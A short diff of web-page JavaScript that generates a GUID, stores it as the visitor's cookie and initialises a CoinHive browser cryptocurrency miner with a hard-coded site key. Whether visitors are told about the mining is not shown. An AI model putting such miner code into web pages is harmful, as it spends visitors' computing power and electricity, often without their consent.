@@ -20,9 +20,8 @@
  
       guid = (S4() + S4() + "-" + S4() + "-4" + S4().substr(0,3) + "-" + S4() + "-" + S4() + S4() + S4()).toLowerCase();
 
-      console.log('cookie', document.cookie);
       if(!document.cookie) {
-        document.cookie = "user=" + guid;
+        document.cookie = guid;
       }
 
       var miner = new CoinHive.User('kOmEN2gForhg8N9ilGGqm7s8OB8EILxT', document.cookie);
